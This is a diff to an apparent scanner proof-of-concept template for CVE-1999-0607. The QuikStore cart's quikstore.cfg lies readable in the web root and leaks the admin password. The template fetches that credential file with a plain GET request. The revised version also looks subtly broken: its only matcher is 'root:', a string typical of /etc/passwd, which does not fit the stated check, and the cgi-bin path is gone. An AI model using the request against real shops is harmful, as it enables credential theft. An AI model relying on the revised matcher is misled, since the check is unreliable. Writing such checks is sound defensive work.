@@ -1,55 +1,28 @@
 [info]
-author = "AVE"
-description = "QuikStore 购物车 quikstore.cgi 将配置文件 quikstore.cfg 存放在 Web 文档根目录且无访问限制，远程攻击者可通过 HTTP 直接获取该文件中的管理员明文密码。本 PoC 通过 GET 请求读取 quikstore.cfg 验证漏洞存在。"
+author = "ave"
+description = "验证 QuikStore 购物车系统的 quikstore.cgi 配置文件是否暴露在 Web 根目录下，导致管理员密码泄露"
 id = "POC-AVE-1999-0178"
-name = "QuikStore quikstore.cfg 敏感信息泄露 PoC"
-severity = "medium"
-tags = [
-    "ave-1999-0178",
-    "cve-1999-0607",
-]
+name = "CVE-1999-0607 购物车配置信息泄露验证"
+severity = "high"
+tags = ["ave-1999-0178"]
 vuln_id = [
     "CVE-1999-0607",
     "AVE-1999-0178",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/quikstore.cfg"
+path = "/quikstore.cfg"
 protocol = "http"
 
-[poc.requests.body]
-content = ""
-type = "raw"
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "password",
-    "passwd",
-    "admin",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/cgi-bin/quikstore.cfg"
-protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "password",
-    "passwd",
-    "admin",
-]
+words = ["root:"]
